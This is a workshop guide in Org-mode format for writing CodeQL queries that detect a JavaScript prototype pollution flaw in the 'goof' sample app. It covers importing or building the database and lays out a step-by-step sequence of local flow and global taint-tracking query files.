javascript/codeql-js-goof-workshop/workshop.org
** Import the CodeQL database
   The codeql database for this project is part of the workshop zip file.  You
   likely got it in the setup step, but here is the link:  [[https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing][codeql-js-goof-workshop.zip]].

   Next, import the database directory into your VS Code workspace; the name is
   =js-goof-9300e9a=.

   For completeness and reference, here are the steps used to build the codeql
   database; this requires the codeql cli tools:

   #+BEGIN_SRC sh
       #* build db
       SRCDIR=$HOME/local/goof
       DB=$HOME/local/db/js-goof-$(cd $SRCDIR && git rev-parse --short HEAD)
       echo $DB
       test -d "$DB" && rm -fR "$DB"
       mkdir -p "$DB"

       export PATH=$HOME/local/vmsync/codeql224:"$PATH"
       codeql database create --language=javascript -s $SRCDIR  -j 8 -v $DB

       # Successfully created database at ~/local/db/js-goof-9300e9a
   #+END_SRC

** Custom query for local flow
   Based on what we found in [[*Find problems in source code][Find problems in source code]], the sink should be
   any argument to =merge()= past the first, so let's use that.

   The files [[./flow-query-0.ql]] etc. build a local flow query from scratch for the
   Javascript Prototype Pollution problem.  We cover these in detail in the
   workshop, but here is the outline of what each introduces for later reference:

   - [[./flow-query-0.ql]]  identify sink: from, where, select, MethodCallExpr
   - [[./flow-query-1.ql]]  getAnArgument
   - [[./flow-query-2.ql]]  Introduce =predicate= and convert to =predicate mergeCallArg= 
   - [[./flow-query-3.ql]]  identify source: FunctionExpr, getName
   - [[./flow-query-4.ql]]  parameter and body: getNumParameter, getBody
   - [[./flow-query-5.ql]]  source argument: getParameter
   - [[./flow-query-6.ql]]  convert to =predicate chatHandler=
   - [[./flow-query-7.ql]]  Local flow attempt: getASuccessor, =operator +=,
     =DataFlowNode=, getAstNode
   - [[./flow-query-8.ql]]  Flow debugging: flow from source to any
   - [[./flow-query-9.ql]]  Flow debugging: sink only (sanity check)
   - [[./flow-query-10.ql]]  Flow debugging: any to sink
   - [[./flow-query-11.ql]]  Flow try: any to any child of sink: introduce =exists=,
     getAChild, =operator *=
   - [[./flow-query-12.ql]]  Local flow: Re-introduce the source restriction,
     simplify =exists=, get working flow query.
   - [[./flow-query-13.ql]] Add =predicate mergeCallArg= and =predicate chatHandler=
     taking =DataFlowNode= to clean up and for re-use in global flow query.

** Custom Global TaintTracking Query and Path Query
   The [[*Custom query for local flow][Custom query for local flow]] developed the predicates we need for a global
   taint tracking query.  The files [[./GoofPrototypePollution-0.ql]] etc. develop
   this query and list pairs of results (sources and sinks).  The sequence:
   - [[./GoofPrototypePollution-0.ql]]  Raw global taint tracking configuration
        template.  Introduces =class=, characteristic predicate,
        =TaintTrackingConfiguration= and =hasFlow()=.
   - [[./GoofPrototypePollution-1.ql]]  Plug in the previously developed predicates
        =mergeCallArg= and =chatHandler=, see the flow pairs.
   - [[./GoofPrototypePollution-2.ql]]  Changes to get a path query.  In addition to
        the result pairs listed by [[./GoofPrototypePollution-1.ql]], this /path query/
        also shows some data flow paths between the sources and sinks.  For this
        example, they are all local.

